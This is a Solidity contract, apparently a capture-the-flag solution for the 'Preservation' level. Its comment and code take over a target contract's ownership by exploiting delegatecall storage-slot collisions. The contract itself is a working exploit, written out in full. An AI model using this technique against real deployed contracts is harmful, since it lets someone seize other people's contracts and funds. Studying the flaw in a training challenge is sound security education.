// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.15;

/** 
    @title Hacker contract for Preservation
    @notice Delegatecall uses the code of the called contract and reads/writes the data to the caller contract.
            An address can be sent as a uint to replace the address of timeZone1Library since it is positioned at the same storage slot of storedTime in the library.
            Then, the logic of setTime in the attack contract is modified to write to the third storage slot where the address of the owner is stored.
*/

interface Preservation {
    function setFirstTime(uint _timeStamp) external;
}

contract HackPreservation {
    Preservation toHack; // slot 0
    uint random; // slot 1
    address owner; // slot 2

    constructor(address _toHack) {
        toHack = Preservation(_toHack);
    }

    function becomeTimezone1Library() external {
        uint256 addressContractInt = uint160(address(this));
        toHack.setFirstTime(addressContractInt);
    }

    function setTime(uint256) external {
        owner = msg.sender;
    }
}

// 0x42276067Ac6108eA09B628F36a0725060Aa8D1EC